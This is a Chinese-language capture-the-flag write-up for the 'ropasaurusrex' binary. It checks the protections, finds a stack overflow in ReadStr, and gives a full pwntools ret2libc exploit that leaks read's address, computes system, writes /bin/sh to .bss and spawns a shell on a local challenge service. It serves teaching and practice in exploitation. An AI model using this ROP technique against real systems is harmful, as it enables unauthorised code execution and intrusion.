# 确定安全保护

```text
Arch:     i386-32-little
RELRO:    No RELRO
Stack:    No canary found
NX:       NX enabled
PIE:      No PIE (0x8048000)
```

可以看出主要开启了堆栈执行保护。

# 确定漏洞

简单阅读源码之后，可以确定该题的漏洞为栈溢出。

```C
ssize_t ReadStr()
{
  char buf; // [sp+10h] [bp-88h]@1

  return read(0, &buf, 0x100u);
}
```

由于开启了堆栈执行保护，所以我们还是选择利用system函数吧。

# 确定地址

已经给了libc.so，所以我们可以利用对应的偏移来获得system地址。同时我们可以利用栈溢出来获取read的函数地址。

# 基本思路

- 利用栈溢出首先获取read的函数地址。
- 利用相对偏移获取system的函数地址。
- 向bss段写入/bin/sh\x00字符串。
- 调用system函数。

# exp

```python
from pwn import *
from LibcSearcher import *
context.log_level = 'debug'
rop = ELF('./ropasaurusrex')
if args['REMOTE']:
    sh = remote('127.0.0.1', 7777)
else:
    sh = process('./ropasaurusrex')
libc = ELF('./libc.so')
read_plt = rop.plt['read']
write_plt = rop.plt['write']
read_got = rop.got['read']
bss_base = rop.bss()
pop3_ret = 0x080484b6
vul_addr = 0x080483F4
# get read addr
payload = flat(
    ['a' * 0x88, 'b' * 4, write_plt, pop3_ret, 1, read_got, 4, vul_addr])
sh.sendline(payload)
read_addr = u32(sh.recv(4))
libc_base = read_addr - libc.symbols['read']
system_addr = libc_base + libc.symbols['system']
# read /bin/sh at bss base
# get shell
payload = flat([
    'a' * 0x88, 'b' * 4, read_plt, pop3_ret, 0, bss_base, 8, system_addr,
    'bbbb', bss_base
])
sh.sendline(payload)
#gdb.attach(sh)
sh.sendline('/bin/sh\x00')
sh.interactive()
```



